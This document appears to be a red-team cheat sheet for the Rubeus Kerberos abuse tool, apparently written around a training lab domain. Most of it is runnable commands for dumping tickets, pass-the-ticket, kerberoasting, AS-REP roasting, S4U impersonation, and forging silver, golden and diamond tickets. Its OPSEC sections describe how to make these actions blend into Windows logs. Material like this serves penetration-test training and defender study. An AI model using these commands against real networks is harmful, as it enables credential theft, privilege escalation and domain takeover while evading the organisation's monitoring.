[Rubeus](https://github.com/GhostPack/Rubeus) is a C# tool designed for Kerberos interaction and abuses, using legitimate Windows APIs.


## Usage

---

### describe

Gets the TGT for the current user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe
```

### triage

List all the Kerberos tickets in your current logon session and if elevated, from all logon sessions on the machine.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

### dump

Extracts TGTs and TGSs from memory.
If not elevated, we can only pull tickets from our own session.  Without any further arguments, Rubeus will extract all tickets possible, but we can be more specific by using the `/luid` and `/service` parameters.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
```

### createnetonly

Starts a new hidden process on the machine.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```
This creates a new LUID without tickets inside, so won't be visible with triage just yet.

**OPSEC**

By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.

We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```

#### Pass the Ticket

Imports a ticket for the specified user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
```

### ptt

Passes a ticket into a specified Local Unique Identity number (LUID).

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
```

Triage will now detect the TGT.

### asktgt

Requests a TGT for a specified user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
```

**OPSEC**

Using an NTLM hash results in a ticket encrypted using RC4 (0x17).  This is considered a legacy encryption type and therefore often stands out as anomalous in a modern Windows environment.

To obtain a TGT encrypted using AES256 (0x12), you guessed it, use the user's AES256 hash instead.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap
```

It will be practically undistinguishable from the other TGT requests, with the exception of two fields:

1. The Supplied Realm Name will be dev.cyberbotic.io, instead of DEV.
2. The Ticket Options will be 0x40800010 instead of 0x40810010.

The asktgt command has two optional parameters that we can use to blend in a bit more.

If no `/domain` is specified, Rubeus uses the FQDN of the domain this computer is in.  Instead, we can force it to use the NetBIOS name with `/domain:DEV`.  There is also an `/opsec` flag which tells Rubeus to request the TGT in such a way that results in the Ticket Options being 0x40810010.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

#### Get AES Ticket

The `/enctype:aes256` returns an AES256 ticket instead of RC4.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA[...snip...]QCAgfQ /password:"06ce8e51-a71a-4e0c-b8a3-992851ede95f" /enctype:aes256 /nowrap
```

Use `/domain` for domain users.

#### Request Using Certificate

Requests TGT using a certificate for the specified user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
```

#### Request with RC4

RC4 tickets are used by default across trusts.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
```

### asktgs

Requests a referral ticket from the current domain to the target domain.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap
```

### kerberoast

Performs a kerberoasting attack.

#### All Users

Performs a kerberoasting attack against all the kerberoastable users.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
```

#### One User

Performs a kerberoasting attack against a specified user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

### asreproast

Performs an ASREP roasting attack against a specified user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```

### monitor

Monitors for new TGTs as they get cached.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
```

### s4u

Performs a service for user request.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
```

where:

- `/impersonateuser` is the user we want to impersonate.
- `/msdsspn` is the service principal name that SQL-2 is allowed to delegate to.
- `/user` is the principal allowed to perform the delegation.
- `/ticket` is the TGT for `/user`.

#### AES256

Performs a service for user request with an AES256 ticket.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:PVWUMPYT$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:46B94228F43282498F562FEF99C5C4AF67269BE5C8AD31B193135C7BD38A28A2 /nowrap
```

#### altservice

Requests a service ticket for a service and modifies the SPN to the specified `altservice`.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
```


### s4u self

Performs a service for user to self request.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
```

##### Pass the Ticket

Requests a service ticket for a service and modifies the SPN to the specified `altservice` with a pass the ticket method.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD[...snip...]5pbw== /ptt
```

### hash

Calculates the hashes of a password.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
```

### tgtdeleg

Returns a usable TGT for the current user. (non-elevated)

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
```


### silver

Forges a silver ticket for a specified service.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
```


### golden

Forges a golden ticket for a specified user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
```

#### Extra SIDs

Takes multiple SIDs. Mainly used in domain trust attacks.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap
```


### diamond

Forges a diamond ticket for a specified user.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```

where:

- `/tgtdeleg` uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
- `/ticketuser` is the username of the user to impersonate.
- `/ticketuserid` is the domain RID of that user.
- `/groups` are the desired group RIDs (512 being Domain Admins).
- `/krbkey` is the krbtgt AES256 hash.

#### Extra SIDs

Takes multiple SIDs. Mainly used in domain trust attacks.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```